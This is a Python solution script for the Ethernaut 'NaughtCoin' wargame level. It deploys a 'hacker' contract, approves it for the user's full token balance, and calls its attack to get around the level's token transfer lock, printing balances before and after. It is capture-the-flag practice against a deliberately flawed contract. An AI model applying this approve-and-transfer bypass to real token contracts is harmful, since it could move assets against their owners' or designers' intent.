from ape import accounts, project
from ..utils.helper import get_level_instance, level_completed

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0x36E92B2751F260D6a4749d7CA58247E7f8198284"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.NaughtCoin.deploy(instance, sender=user)

    # setting up level instance and naught coin contract
    print("\n--- Setting up instance contract ---\n")
    naught_coin = project.ERC20.at(instance)

    # exploit goes here
    # note that you can approve yourself, but in this case I chose to approve my hacker contract
    print(f"\n-- Our balance before the exploit: {naught_coin.balanceOf(user)} ---\n")
    print(
        f"\n--- Balance of our hacker contract: {naught_coin.balanceOf(hacker)} ---\n"
    )
    print("\n--- Exploiting level instance ---\n")

    naught_coin.approve(hacker, naught_coin.balanceOf(user), sender=user)

    hacker.attack(sender=user)

    print(f"\n-- Our balance after the exploit: {naught_coin.balanceOf(user)} ---\n")
    print(
        f"\n--- Balance of our hacker contract: {naught_coin.balanceOf(hacker)} ---\n"
    )

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
